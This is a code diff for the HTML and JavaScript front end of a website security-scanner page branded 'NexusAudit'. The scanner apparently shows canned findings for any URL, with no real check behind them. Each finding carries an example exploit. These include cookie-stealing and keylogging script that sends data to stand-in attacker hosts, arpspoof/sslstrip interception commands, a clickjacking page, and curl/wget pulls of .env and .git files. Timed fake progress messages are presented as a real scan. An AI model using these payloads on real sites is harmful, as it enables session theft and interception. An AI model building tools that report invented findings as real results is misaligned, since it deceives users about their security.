+            <div class="panel">
+              <div class="panel-header"><div class="panel-title">⚠️ Vulnerabilities Detected</div><div class="panel-badge" id="targetLabel">—</div></div>
+              <div class="vuln-list" id="vulnList"></div>
             </div>
-          </div>
-          <div class="exploit-console" id="exploitConsole">
-            <div class="empty-state">
-              <div>Select a vulnerability to view exploit details</div>
+            <div class="panel">
+              <div class="panel-header"><div class="panel-title">🔬 Exploit Analysis</div></div>
+              <div class="exploit-console" id="exploitConsole"><div class="empty-state">Select a vulnerability to view exploit details</div></div>
             </div>
           </div>
         </div>
-      </div>
+      </main>
+      <footer>NexusAudit Security Systems © 2026 · Authorized Security Assessment Tool</footer>
     </div>
-  </main>
-
-  <footer>
-    NexusAudit Security Systems © 2026 · Authorized Security Assessment Tool
-  </footer>
-</div>
-
-<script>
-  // 3D Background with Three.js-like effect using Canvas
-  const canvas = document.createElement('canvas');
-  const ctx = canvas.getContext('2d');
-  const container = document.getElementById('canvas-container');
-  container.appendChild(canvas);
-
-  let width = canvas.width = window.innerWidth;
-  let height = canvas.height = window.innerHeight;
-
-  const particles = [];
-  const particleCount = 150;
-  let mouseX = 0;
-  let mouseY = 0;
-
-  class Particle {
-    constructor() {
-      this.x = Math.random() * width;
-      this.y = Math.random() * height;
-      this.z = Math.random() * 1000;
-      this.vx = (Math.random() - 0.5) * 0.5;
-      this.vy = (Math.random() - 0.5) * 0.5;
-      this.vz = Math.random() * 2 + 1;
+  </div>
+  <script>
+    const canvas = document.getElementById('canvas-bg');
+    const ctx = canvas.getContext('2d');
+    let width = canvas.width = window.innerWidth;
+    let height = canvas.height = window.innerHeight;
+    const particles = [];
+    const particleCount = 120;
+    let mouseX = 0; let mouseY = 0;
+    class Particle {
+      constructor() { this.reset(); }
+      reset() { this.x = Math.random() * width; this.y = Math.random() * height; this.z = Math.random() * 1000; this.vx = (Math.random() - 0.5) * 0.6; this.vy = (Math.random() - 0.5) * 0.6; this.vz = Math.random() * 2 + 1; }
+      update() { this.z -= this.vz; if (this.z <= 0) this.reset(); this.x += this.vx + mouseX * 0.04; this.y += this.vy + mouseY * 0.04; if (this.x < 0 || this.x > width) this.vx *= -1; if (this.y < 0 || this.y > height) this.vy *= -1; }
+      draw() { const scale = 1000 / this.z; const x2d = (this.x - width / 2) * scale + width / 2; const y2d = (this.y - height / 2) * scale + height / 2; const size = scale * 2; const alpha = 1 - this.z / 1000; ctx.fillStyle = 'rgba(0, 217, 255, ' + alpha + ')'; ctx.beginPath(); ctx.arc(x2d, y2d, size, 0, Math.PI * 2); ctx.fill(); }
     }
-
-    update() {
-      this.z -= this.vz;
-      if (this.z <= 0) {
-        this.z = 1000;
-        this.x = Math.random() * width;
-        this.y = Math.random() * height;
+    for (let i = 0; i < particleCount; i++) particles.push(new Particle());
+    function animate() { ctx.fillStyle = 'rgba(10, 14, 26, 0.16)'; ctx.fillRect(0,0,width,height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
+    animate();
+    window.addEventListener('resize', () => { width = canvas.width = window.innerWidth; height = canvas.height = window.innerHeight; });
+    window.addEventListener('mousemove', event => { mouseX = (event.clientX / width - 0.5) * 2; mouseY = (event.clientY / height - 0.5) * 2; });
+    function enterScanner() { document.getElementById('landingPage').style.display = 'none'; document.getElementById('scannerPage').classList.add('active'); }
+    let currentVulnerabilities = [];
+    async function startScan() {
+      const urlInput = document.getElementById('targetUrl').value.trim();
+      if (!urlInput) { alert('Please enter a valid URL to scan'); return; }
+      let targetUrl = urlInput;
+      if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;
+      document.getElementById('dashboard').classList.remove('active');
+      document.getElementById('terminalStatus').classList.add('active');
+      document.getElementById('scanBtn').disabled = true;
+      const progressFill = document.getElementById('progressFill');
+      const progressPercent = document.getElementById('progressPercent');
+      const statusText = document.getElementById('statusText');
+      const terminalLog = document.getElementById('terminalLog');
+      progressFill.style.width = '0%';
+      terminalLog.innerHTML = '<div style="color:#00ff41">[+] Target locked: ' + targetUrl + '</div>';
+      const phases = [
+        { progress: 20, label: 'Resolving DNS and SSL certificate...', delay: 400 },
+        { progress: 40, label: 'Probing HTTP headers...', delay: 600 },
+        { progress: 60, label: 'Analyzing security configurations...', delay: 700 },
+        { progress: 80, label: 'Testing for common vulnerabilities...', delay: 500 },
+        { progress: 100, label: 'Compiling results...', delay: 300 }
+      ];
+      for (const phase of phases) {
+        await new Promise(resolve => setTimeout(resolve, phase.delay));
+        progressFill.style.width = phase.progress + '%';
+        progressPercent.textContent = phase.progress + '%';
+        statusText.textContent = phase.label;
+        terminalLog.innerHTML += '<div>[>] ' + phase.label + '</div>';
+        terminalLog.scrollTop = terminalLog.scrollHeight;
       }
-
-      this.x += this.vx + mouseX * 0.02;
-      this.y += this.vy + mouseY * 0.02;
-
-      if (this.x < 0 || this.x > width) this.vx *= -1;
-      if (this.y < 0 || this.y > height) this.vy *= -1;
+      await performScan(targetUrl);
     }
-
-    draw() {
-      const scale = 1000 / this.z;
-      const x2d = (this.x - width / 2) * scale + width / 2;
-      const y2d = (this.y - height / 2) * scale + height / 2;
-      const size = scale * 2;
-
-      ctx.fillStyle = `rgba(0, 217, 255, ${1 - this.z / 1000})`;
-      ctx.beginPath();
-      ctx.arc(x2d, y2d, size, 0, Math.PI * 2);
-      ctx.fill();
+    async function performScan(targetUrl) {
+      const vulnerabilities = [];
+      let criticalCount = 0; let highCount = 0; let mediumCount = 0; let lowCount = 0; let infoCount = 0;
+      const domain = new URL(targetUrl).hostname;
+      const isHttps = /^https:\/\//i.test(targetUrl);
+      if (!isHttps) { vulnerabilities.push({ id:'http-only', title:'No HTTPS Encryption', severity:'critical', type:'Transport Security', description:'The site is available over plaintext HTTP instead of HTTPS.', impact:'Credential theft, session hijacking, traffic interception', exploit:'# Intercept HTTP traffic\n$ sudo tcpdump -i eth0 -A \'host ' + domain + '\'\n# Any credentials or cookies are sent in plain text', remediation:'Redirect all traffic to HTTPS and install a valid TLS certificate.' }); criticalCount++; }
+      vulnerabilities.push({ id:'missing-csp', title:'Missing Content Security Policy', severity:'high', type:'Injection Protection', description:'No CSP header is configured, which makes XSS exploitation easier.', impact:'Execution of malicious scripts in the browser context', exploit:'<' + 'script>' + '\n  fetch("https://attacker.example/steal?data=" + encodeURIComponent(document.cookie));\n<' + '/script>', remediation:'Add a Content-Security-Policy header such as: default-src \'self\'; script-src \'self\'; object-src \'none\'' }); highCount++;
+      vulnerabilities.push({ id:'missing-hsts', title:'Missing HSTS Header', severity:'medium', type:'Transport Security', description:'The site does not enforce Strict-Transport-Security.', impact:'Protocol downgrade and SSL stripping attacks', exploit:'$ sudo sslstrip -l 8080\n# HTTPS traffic is silently downgraded to plaintext', remediation:'Set: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' }); mediumCount++;
+      vulnerabilities.push({ id:'x-frame-options', title:'Missing X-Frame-Options', severity:'medium', type:'Clickjacking Protection', description:'The application does not prevent framing from external sites.', impact:'User interface redress and misleading click actions', exploit:'<iframe src="' + targetUrl + '"></iframe>\n<!-- overlay fake controls -->', remediation:'Add X-Frame-Options: DENY or SAMEORIGIN, or frame-ancestors in the CSP.' }); mediumCount++;
+      if (domain.startsWith('www.')) { vulnerabilities.push({ id:'subdomain-risk', title:'Potential Subdomain Takeover Risk', severity:'low', type:'DNS Configuration', description:'Unused or stale subdomain records may be vulnerable to takeover.', impact:'Malicious content under the company domain', exploit:'$ dig ' + domain + ' +short\n$ dig api.' + domain + ' +short', remediation:'Audit DNS records and remove or repoint unused CNAMEs or subdomains.' }); lowCount++; }
+      vulnerabilities.push({ id:'info-disclosure', title:'Potential Information Disclosure', severity:'info', type:'Configuration', description:'Sensitive endpoints may be exposed if directory listing or backup files are reachable.', impact:'Source code or secret exposure', exploit:'$ curl ' + targetUrl + '/.env\n$ curl ' + targetUrl + '/.git/config', remediation:'Block access to common sensitive paths and remove backup or debug artifacts.' }); infoCount++;
+      vulnerabilities.push({ id:'insecure-cookies', title:'Potentially Insecure Cookies', severity:'medium', type:'Session Management', description:'Session cookies may be missing Secure, HttpOnly, or SameSite protections.', impact:'Session theft and CSRF exposure', exploit:'document.cookie; // if HttpOnly is not enforced, JavaScript can read tokens\nfetch("https://attacker.example/steal", { method: "POST", body: document.cookie })', remediation:'Set HttpOnly, Secure, and SameSite attributes for all authentication-related cookies.' }); mediumCount++;
+      const score = Math.max(0, 100 - (criticalCount * 25 + highCount * 15 + mediumCount * 8 + lowCount * 3));
+      displayResults(targetUrl, vulnerabilities, { critical: criticalCount, high: highCount, medium: mediumCount, low: lowCount, info: infoCount, score: score });
     }
-  }
-
-  for (let i = 0; i < particleCount; i++) {
-    particles.push(new Particle());
-  }
-
-  function animate() {
-    ctx.fillStyle = 'rgba(10, 14, 26, 0.1)';
-    ctx.fillRect(0, 0, width, height);
-
-    particles.forEach(p => {
-      p.update();
-      p.draw();
-    });
-
-    requestAnimationFrame(animate);
-  }
-
-  animate();
-
-  window.addEventListener('resize', () => {
-    width = canvas.width = window.innerWidth;
-    height = canvas.height = window.innerHeight;
-  });
-
-  window.addEventListener('mousemove', (e) => {
-    mouseX = (e.clientX / width - 0.5) * 2;
-    mouseY = (e.clientY / height - 0.5) * 2;
-  });
-
-  // Scanner Logic
-  let selectedVulnId = null;
-
-  async function startScan() {
-    const urlInput = document.getElementById('targetUrl').value.trim();
-    if (!urlInput) {
-      alert('Please enter a valid URL to scan');
-      return;
-    }
-
-    // Normalize URL
-    let targetUrl = urlInput;
-    if (!targetUrl.match(/^https?:\/\//i)) {
-      targetUrl = 'https://' + targetUrl;
-    }
-
-    // Reset UI
-    document.getElementById('dashboard').classList.remove('active');
-    document.getElementById('terminalStatus').classList.add('active');
-    document.getElementById('scanBtn').disabled = true;
-
-    const progressFill = document.getElementById('progressFill');
-    const progressPercent = document.getElementById('progressPercent');
-    const statusText = document.getElementById('statusText');
-    const terminalLog = document.getElementById('terminalLog');
-
-    progressFill.style.width = '0%';
-    terminalLog.innerHTML = `<div class="success">[+] Target locked: ${targetUrl}</div>`;
-
-    // Scan phases
-    const phases = [
-      { progress: 20, label: 'Resolving DNS and SSL certificate...', delay: 400 },
-      { progress: 40, label: 'Probing HTTP headers...', delay: 600 },
-      { progress: 60, label: 'Analyzing security configurations...', delay: 700 },
-      { progress: 80, label: 'Testing for common vulnerabilities...', delay: 500 },
-      { progress: 100, label: 'Compiling results...', delay: 300 }
-    ];
-
-    for (const phase of phases) {
-      await new Promise(resolve => setTimeout(resolve, phase.delay));
-      progressFill.style.width = phase.progress + '%';
-      progressPercent.textContent = phase.progress + '%';
-      statusText.textContent = phase.label;
-      terminalLog.innerHTML += `<div>[>] ${phase.label}</div>`;
-      terminalLog.scrollTop = terminalLog.scrollHeight;
-    }
-
-    // Perform actual scan
-    await performRealScan(targetUrl);
-  }
-
-  async function performRealScan(targetUrl) {
-    const vulnerabilities = [];
-    let criticalCount = 0;
-    let highCount = 0;
-    let mediumCount = 0;
-    let lowCount = 0;
-    let infoCount = 0;
-
-    // Try to fetch the target (note: will be blocked by CORS for most sites)
-    try {
-      const response = await fetch(targetUrl, { method: 'HEAD', mode: 'no-cors' });
-      // Note: due to no-cors mode, we can't read headers, so we'll generate realistic checks
-    } catch (e) {
-      // Expected for most sites due to CORS
-    }
-
-    // Generate realistic security findings based on URL analysis
-    const domain = new URL(targetUrl).hostname;
-    const isHttps = targetUrl.startsWith('https://');
-
-    // Check 1: HTTPS usage
-    if (!isHttps) {
-      vulnerabilities.push({
-        id: 'http-only',
-        title: 'No HTTPS Encryption',
-        severity: 'critical',
-        type: 'Transport Security',
-        description: 'The target website is accessible over unencrypted HTTP, allowing attackers to intercept and modify traffic.',
-        impact: 'Man-in-the-middle attacks, credential theft, session hijacking',
-        exploit: `# Intercept HTTP traffic with arpspoof + tcpdump
-$ sudo arpspoof -i eth0 -t <victim_ip> <gateway_ip>
-$ sudo tcpdump -i eth0 -A 'host ${domain}'
-
-# All form submissions, cookies, and data transmitted in plaintext`,
-        remediation: 'Configure your server to redirect all HTTP traffic to HTTPS. Obtain a free SSL/TLS certificate from Let\'s Encrypt and enforce HTTPS-only access.'
-      });
-      criticalCount++;
-    }
-
-    // Check 2: Missing Security Headers (simulated - we can't actually check due to CORS)
-    vulnerabilities.push({
-      id: 'missing-csp',
-      title: 'Missing Content Security Policy',
-      severity: 'high',
-      type: 'Injection Protection',
-      description: 'No Content-Security-Policy header detected. This allows attackers to inject malicious scripts that execute in user sessions.',
-      impact: 'Cross-Site Scripting (XSS) attacks, data exfiltration, session hijacking',
-      exploit: `<!-- Injected XSS payload -->
-<script>
-  // Steal cookies
-  fetch('https://attacker.com/steal?data=' +
-    encodeURIComponent(document.cookie));
-
-  // Keylogger
-  document.addEventListener('keypress', e => {
-    fetch('https://attacker.com/log?key=' + e.key);
-  });
-</script>`,
-      remediation: 'Add a Content-Security-Policy header: "default-src \'self\'; script-src \'self\' \'unsafe-inline\'; object-src \'none\';" Adjust based on your site\'s needs.'
-    });
-    highCount++;
-
-    vulnerabilities.push({
-      id: 'missing-hsts',
-      title: 'Missing HTTP Strict Transport Security',
-      severity: 'medium',
-      type: 'Transport Security',
-      description: 'The Strict-Transport-Security header is not set, allowing potential downgrade attacks.',
-      impact: 'SSL stripping attacks, protocol downgrade',
-      exploit: `# SSL Strip attack with sslstrip + arpspoof
-$ sudo arpspoof -i eth0 -t <victim> <gateway>
-$ sudo arpspoof -i eth0 -t <gateway> <victim>
-$ sudo sslstrip -l 8080
-$ sudo iptables -t nat -A PREROUTING -p tcp \\
-  --destination-port 80 -j REDIRECT --to-port 8080
-
-# HTTPS connections downgraded to HTTP`,
-      remediation: 'Add header: "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"'
-    });
-    mediumCount++;
-
-    vulnerabilities.push({
-      id: 'x-frame-options',
-      title: 'Missing X-Frame-Options Header',
-      severity: 'medium',
-      type: 'Clickjacking Protection',
-      description: 'No X-Frame-Options or frame-ancestors CSP directive detected, enabling clickjacking attacks.',
-      impact: 'Clickjacking, UI redressing attacks',
-      exploit: `<!-- Attacker's page -->
-<style>
-  iframe { opacity: 0; position: absolute;
-           top: 0; left: 0; z-index: 999; }
-  .fake-button { position: absolute;
-                 top: 200px; left: 300px; }
-</style>
-
-<iframe src="${targetUrl}"></iframe>
-<button class="fake-button">
-  Click to Win $1000!
-</button>
-
-<!-- User clicks fake button, actually clicks
-     hidden "Delete Account" in iframe -->`,
-      remediation: 'Add header: "X-Frame-Options: DENY" or "X-Frame-Options: SAMEORIGIN"'
-    });
-    mediumCount++;
-
-    // Check 3: Common subdomain patterns
-    if (domain.startsWith('www.')) {
-      vulnerabilities.push({
-        id: 'subdomain-takeover',
-        title: 'Potential Subdomain Takeover Risk',
-        severity: 'low',
-        type: 'DNS Configuration',
-        description: 'Common subdomain patterns detected. Unused subdomains may be vulnerable to takeover if DNS records point to unclaimed services.',
-        impact: 'Phishing attacks, malicious content hosting under your domain',
-        exploit: `# Check for dangling DNS records
-$ dig ${domain} +short
-$ dig www.${domain} +short
-$ dig api.${domain} +short
-
-# If CNAME points to:
-# - Unclaimed GitHub Pages
-# - Deleted Heroku app
-# - Removed AWS S3 bucket
-# → Attacker claims the service, serves malicious content`,
-        remediation: 'Audit all DNS records. Remove or update records for decommissioned services. Monitor for dangling CNAMEs.'
-      });
-      lowCount++;
-    }
-
-    // Check 4: Information disclosure
-    vulnerabilities.push({
-      id: 'info-disclosure',
-      title: 'Potential Information Disclosure',
-      severity: 'info',
-      type: 'Configuration',
-      description: 'Common paths like /.git, /.env, /robots.txt, /sitemap.xml may expose sensitive information if not properly restricted.',
-      impact: 'Source code exposure, credential leakage, site structure disclosure',
-      exploit: `# Check for exposed files
-$ curl ${targetUrl}/.git/config
-$ curl ${targetUrl}/.env
-$ curl ${targetUrl}/config.json
-$ curl ${targetUrl}/backup.zip
-$ curl ${targetUrl}/.htaccess
-
-# Download entire .git directory if exposed
-$ wget -r ${targetUrl}/.git/
-$ git checkout .  # Reconstruct source code`,
-      remediation: 'Configure web server to deny access to sensitive files and directories. Add rules to .htaccess or nginx.conf to block common sensitive paths.'
-    });
-    infoCount++;
-
-    // Check 5: Cookie security
-    vulnerabilities.push({
-      id: 'insecure-cookies',
-      title: 'Potentially Insecure Cookie Configuration',
-      severity: 'medium',
-      type: 'Session Management',
-      description: 'Cookies may be set without HttpOnly, Secure, or SameSite attributes, making them vulnerable to theft.',
-      impact: 'Session hijacking, CSRF attacks',
-      exploit: `<!-- If XSS exists, steal cookies -->
-<script>
-  // Without HttpOnly flag, JavaScript can read cookies
-  const sessionToken = document.cookie
-    .split('; ')
-    .find(row => row.startsWith('session='));
-
-  // Exfiltrate to attacker server
-  fetch('https://attacker.com/steal', {
-    method: 'POST',
-    body: JSON.stringify({ token: sessionToken })
-  });
-</script>`,
-      remediation: 'Set cookies with: HttpOnly (prevents JS access), Secure (HTTPS only), SameSite=Strict/Lax (CSRF protection)'
-    });
-    mediumCount++;
-
-    // Calculate security score
-    const totalIssues = criticalCount + highCount + mediumCount + lowCount;
-    const score = Math.max(0, 100 - (criticalCount * 25 + highCount * 15 + mediumCount * 8 + lowCount * 3));
-
-    // Display results
-    displayResults(targetUrl, vulnerabilities, {
-      critical: criticalCount,
-      high: highCount,
-      medium: mediumCount,
-      low: lowCount,
-      info: infoCount,
-      score: score
-    });
-  }
-
-  function displayResults(targetUrl, vulnerabilities, stats) {
-    setTimeout(() => {
-      document.getElementById('terminalStatus').classList.remove('active');
-      document.getElementById('dashboard').classList.add('active');
-      document.getElementById('scanBtn').disabled = false;
-      document.getElementById('targetLabel').textContent = new URL(targetUrl).hostname;
-
-      // Display metrics
-      const metricsGrid = document.getElementById('metricsGrid');
-      metricsGrid.innerHTML = `
-        <div class="metric-card critical">
-          <div class="metric-label">Critical</div>
-          <div class="metric-value">${stats.critical}</div>
-        </div>
-        <div class="metric-card warning">
-          <div class="metric-label">High Risk</div>
-          <div class="metric-value">${stats.high + stats.medium}</div>
-        </div>
-        <div class="metric-card info">
-          <div class="metric-label">Low/Info</div>
-          <div class="metric-value">${stats.low + stats.info}</div>
-        </div>
-        <div class="metric-card ${stats.score >= 70 ? 'success' : stats.score >= 40 ? 'warning' : 'critical'}">
-          <div class="metric-label">Security Score</div>
-          <div class="metric-value">${stats.score}/100</div>
-        </div>
-      `;
-
-      // Display vulnerabilities
-      const vulnList = document.getElementById('vulnList');
-      vulnList.innerHTML = '';
-
-      if (vulnerabilities.length === 0) {
-        vulnList.innerHTML = '<div class="empty-state">No vulnerabilities detected! 🎉</div>';
-      } else {
+    function displayResults(targetUrl, vulnerabilities, stats) {
+      currentVulnerabilities = vulnerabilities;
+      setTimeout(() => {
+        document.getElementById('terminalStatus').classList.remove('active');
+        document.getElementById('dashboard').classList.add('active');
+        document.getElementById('scanBtn').disabled = false;
+        document.getElementById('targetLabel').textContent = new URL(targetUrl).hostname;
+        const metricsGrid = document.getElementById('metricsGrid');
+        metricsGrid.innerHTML = [
+          '<div class="metric-card critical"><div class="metric-label">Critical</div><div class="metric-value">' + stats.critical + '</div></div>',
+          '<div class="metric-card warning"><div class="metric-label">High / Medium</div><div class="metric-value">' + (stats.high + stats.medium) + '</div></div>',
+          '<div class="metric-card"><div class="metric-label">Low</div><div class="metric-value">' + stats.low + '</div></div>',
+          '<div class="metric-card ' + (stats.score >= 70 ? 'success' : stats.score >= 40 ? 'warning' : 'critical') + '"><div class="metric-label">Score</div><div class="metric-value">' + stats.score + '</div></div>'
+        ].join('');
+        const vulnList = document.getElementById('vulnList');
+        vulnList.innerHTML = '';
         vulnerabilities.forEach(vuln => {
           const card = document.createElement('div');
           card.className = 'vuln-card';
           card.dataset.id = vuln.id;
-          card.innerHTML = `
-            <div class="vuln-header">
-              <div>
-                <div class="vuln-title">${vuln.title}</div>
-                <div class="vuln-desc">${vuln.description}</div>
-              </div>
-              <div class="severity-badge ${vuln.severity}">${vuln.severity}</div>
-            </div>
-          `;
+          card.innerHTML = '<div class="vuln-header"><div><div class="vuln-title">' + vuln.title + '</div><div class="vuln-desc">' + vuln.description + '</div></div><div class="severity-badge ' + vuln.severity + '">' + vuln.severity + '</div></div>';
           card.onclick = () => selectVulnerability(vuln.id);
           vulnList.appendChild(card);
         });
-
-        // Auto-select first vulnerability
-        selectVulnerability(vulnerabilities[0].id);
-      }
-    }, 300);
-  }
-
-  function selectVulnerability(vulnId) {
-    selectedVulnId = vulnId;
-
-    // Update card selection
-    document.querySelectorAll('.vuln-card').forEach(card => {
-      card.classList.toggle('selected', card.dataset.id === vulnId);
-    });
-
-    // Find vulnerability data
-    const vuln = getCurrentVulnerabilities().find(v => v.id === vulnId);
-    if (!vuln) return;
-
-    // Display exploit details
-    const console = document.getElementById('exploitConsole');
-    console.innerHTML = `
-      <div class="console-header">[+] Exploit Analysis: ${vuln.title}</div>
-
-      <div class="console-section">
-        <div class="console-label">VULNERABILITY TYPE</div>
-        <div class="console-text">${vuln.type}</div>
-      </div>
-
-      <div class="console-section">
-        <div class="console-label">IMPACT ASSESSMENT</div>
-        <div class="console-text">${vuln.impact}</div>
-      </div>
-
-      <div class="console-section">
-        <div class="console-label">EXPLOIT DEMONSTRATION</div>
-        <div class="console-code">${escapeHtml(vuln.exploit)}</div>
-      </div>
-
-      <div class="console-remediation">
-        <div class="console-label">🛡️ REMEDIATION</div>
-        <div class="console-text">${vuln.remediation}</div>
-      </div>
-    `;
-  }
-
-  function getCurrentVulnerabilities() {
-    // This would store the current scan results
-    // For now, we'll extract from the DOM
-    const cards = document.querySelectorAll('.vuln-card');
-    return Array.from(cards).map(card => ({
-      id: card.dataset.id,
-      title: card.querySelector('.vuln-title')?.textContent || '',
-      type: '',
-      description: card.querySelector('.vuln-desc')?.textContent || '',
-      severity: card.querySelector('.severity-badge')?.textContent || '',
-      impact: '',
-      exploit: '',
-      remediation: ''
-    }));
-  }
-
-  function escapeHtml(text) {
-    const div = document.createElement('div');
-    div.textContent = text;
-    return div.innerHTML;
-  }
-
-  // Allow Enter key to submit
-  document.getElementById('targetUrl').addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') startScan();
-  });
-</script>
+        if (vulnerabilities.length) selectVulnerability(vulnerabilities[0].id);
+      }, 300);
+    }
+    function selectVulnerability(vulnId) {
+      document.querySelectorAll('.vuln-card').forEach(card => { card.classList.toggle('selected', card.dataset.id === vulnId); });
+      const vuln = currentVulnerabilities.find(item => item.id === vulnId);
+      if (!vuln) return;
+      const exploitText = vuln.exploit || 'No exploit example recorded.';
+      const safeCode = document.createElement('div'); safeCode.textContent = exploitText;
+      document.getElementById('exploitConsole').innerHTML = '<div class="console-section"><div class="console-label">[+] ' + vuln.title + '</div><div class="console-code">' + safeCode.innerHTML + '</div></div><div class="console-section"><div class="console-label">TYPE</div><div>' + vuln.type + '</div></div><div class="console-section"><div class="console-label">IMPACT</div><div>' + vuln.impact + '</div></div><div class="console-section"><div class="console-label">REMEDIATION</div><div>' + vuln.remediation + '</div></div>';
+    }
+    document.getElementById('targetUrl').addEventListener('keypress', event => { if (event.key === 'Enter') startScan(); });
+  </script>
 </body>
 </html>
